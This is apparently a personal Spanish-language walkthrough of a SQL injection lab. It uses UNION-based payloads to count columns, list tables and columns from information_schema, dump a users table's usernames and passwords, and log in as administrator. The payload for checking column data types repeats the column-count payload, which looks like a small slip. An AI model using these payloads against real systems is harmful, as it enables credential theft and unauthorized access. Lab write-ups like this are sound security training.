## Objetivo:

![[Pasted image 20240622170447.png]]

## Solución:

Seleccionamos una categoría de producto

![[Pasted image 20240622170523.png]]

Lo de siempre:
1. Identificar la cantidad de columnas.

```
' UNION SELECT NULL, NULL-- -
```

2. Ver tipo de dato de cada columna.

```
' UNION SELECT NULL, NULL-- -
```

3. Una vez identificado, crear el payload correspondiente a la explotación que queremos realizar.

Ahora bien aqui ya tenemos que hacer muchas mas cositas, como identificar: 
###### 1. Nombres de tablas

```
' UNION SELECT table_name, NULL FROM information_schema.tables-- -
```

![[Pasted image 20240622172205.png]]

Suponiendo que la tabla de usuarios es esta llamada **users_takhgm** entonces ahora usaremos esa tabla para hacer el descubrimiento de las columnas de dicha tabla para posteriormente extraer los datos...

###### 2. Nombres de las Tablas de Columnas

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_takhgm'-- -
```

![[Pasted image 20240622173010.png]]

Una vez vemos los nombres de las columnas procederemos a extraer la informacion...

3. Extraer los datos de las columnas

```
' UNION SELECT username_pfliyo, password_yvnvgh FROM users_takhgm-- -
```


![[Pasted image 20240622173159.png]]

Ahora iniciamos sesión con el usuario administrador

![[Pasted image 20240622173232.png]]

